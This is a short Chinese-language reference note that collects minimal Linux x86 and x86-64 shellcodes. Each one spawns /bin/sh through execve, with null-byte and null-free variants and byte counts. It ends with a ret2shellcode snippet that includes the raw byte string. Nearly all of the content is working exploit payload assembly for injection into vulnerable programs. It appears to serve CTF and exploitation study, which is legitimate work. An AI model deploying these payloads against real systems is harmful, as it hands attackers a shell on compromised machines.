# Linux ShellCode总结

在寄存器都是非理想值情况下(shellcode可根据环境具体触发时寄存器的值做长度调整)，本着最优通用的原则，整理了Linux下32位和64位最短通用shellcode的编写。

## 32位

### 有"\x00"最短 20 byte

```assembly
xor ecx,ecx               
mul ecx                   
mov al,0xb                
push 0x68732f             
push 0x6e69622f           
mov ebx,esp               
int 0x80
```

### 无"\x00"最短 21 byte

```assembly
xor ecx,ecx
mul ecx
push eax
mov al,0xb
push 0x68732f2f   
push 0x6e69622f   
mov ebx,esp
int 0x80
```

### 标准shellcode 23 byte

```assembly
xor ecx,ecx
xor edx,edx
push edx
push 0x68732f2f
push 0x6e69622f
mov ebx,esp
xor eax,eax
mov al,0xB
int 0x80
```

## 64位

### 有"\x00"最短 22 byte

```assembly
xor rsi,rsi
mul esi
mov rbx,0x68732f6e69622f
push rbx
push rsp
pop rdi
mov al, 59
syscall
```

### 无"\x00" 最短23 byte

```assembly
xor rsi,rsi
mul esi
push rax
mov rbx,0x68732f2f6e69622f
push rbx
push rsp
pop rdi
mov al, 59
syscall
```

### 标准shellcode 31 byte

```assembly
xor    rdi,rdi
xor    rsi,rsi
xor    rdx,rdx
xor    rax,rax
push   rax
mov rbx,0x68732f2f6e69622f
push   rbx
mov    rdi,rsp
mov    al,0x3b
syscall
```

### ret2shellcode

```assembly
shellcode = '''
xor rax,rax
xor rdi,rdi
mov rdi ,0x68732f6e69622f
push rdi              
push rsp                 
pop rdi
xor rsi,rsi
xor rdx,rdx
push 0x3b   
pop rax
syscall
'''
# shellcode = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05'
```

